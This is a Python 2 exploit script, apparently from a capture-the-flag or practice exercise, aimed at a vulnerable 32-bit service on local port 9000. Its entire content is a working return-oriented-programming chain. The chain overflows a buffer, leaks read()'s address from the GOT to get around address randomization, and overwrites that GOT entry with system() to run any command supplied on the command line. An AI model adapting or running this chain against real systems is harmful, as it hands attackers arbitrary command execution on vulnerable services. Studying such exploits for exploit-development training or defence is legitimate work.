#!/usr/bin/python

import os,sys,socket
import struct

addr = ('127.0.0.1', 9000)
cmd = sys.argv[1]+"\0"

libcread_offset = 0xdabd0 #0xe6130 #0xd5980
libcsystem_offset = 0x40190 #0x3d7e0 #0x3ada0

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

payload = "A"*140

# write stdin to .dynamic using read@plt
payload += struct.pack("<I", 0x0804832c) #read() call loc
payload += struct.pack("<I", 0x080484b6) #pppr
payload += struct.pack("<I", 0) #stdin
payload += struct.pack("<I", 0x08049530) #.dynamic
payload += struct.pack("<I", len(cmd)) # length of cmd

#leak addr of read() in randomized libc
payload += struct.pack("<I", 0x0804830c) #write() call loc
payload += struct.pack("<I", 0x080484b6) #pppr
payload += struct.pack("<I", 1) #stdout
payload += struct.pack("<I", 0x0804961c) #read() in GOT
payload += struct.pack("<I", 4) #len

#call read@plt to overwrite the ptr stored in read()'s entry in GOT
payload += struct.pack("<I", 0x0804832c) #read() call loc
payload += struct.pack("<I", 0x080484b6) #pppr
payload += struct.pack("<I", 0) #stdin
payload += struct.pack("<I", 0x0804961c) #read() in GOT
payload += struct.pack("<I", 4) #len

#call read@plt = addr of system() in libc
payload += struct.pack("<I", 0x0804832c) #read() call loc
payload += "BBBB" #bogus ret
payload += struct.pack("<I", 0x08049530) #.dynamic #system() arg

s.connect(addr)

s.send(payload)

s.send(cmd)

#calculate system() addr and send back
readaddr = struct.unpack("<I", s.recv(1024))[0]
print "libc read() found at 0x%.8x" % readaddr
systemaddr = readaddr - libcread_offset + libcsystem_offset
print "libc system() found at 0x%.8x" % systemaddr
s.send(struct.pack("<I", systemaddr))

print s.recv(1024)

s.close()
